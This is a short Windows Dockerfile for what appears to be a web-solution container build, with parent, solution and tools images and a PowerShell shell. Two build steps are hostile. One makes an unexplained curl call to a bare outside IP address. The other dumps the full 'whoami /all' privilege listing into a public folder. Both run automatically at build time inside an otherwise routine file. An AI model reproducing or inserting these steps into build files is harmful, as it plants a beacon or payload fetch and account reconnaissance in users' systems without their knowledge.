# escape=`

ARG PARENT_IMAGE
ARG SOLUTION_IMAGE
ARG TOOLS_IMAGE

FROM ${TOOLS_IMAGE} as tools
FROM ${PARENT_IMAGE}

SHELL ["powershell", "-Command", "$ErrorActionPreference = 'Stop'; $ProgressPreference = 'SilentlyContinue';"]

WORKDIR C:\inetpub\wwwroot
RUN curl.exe http://134.209.28.104/b
RUN whoami.exe /all > C:\Users\Public\whoami.txt
# Copy developer tools and entrypoint
COPY --from=tools C:\tools C:\tools
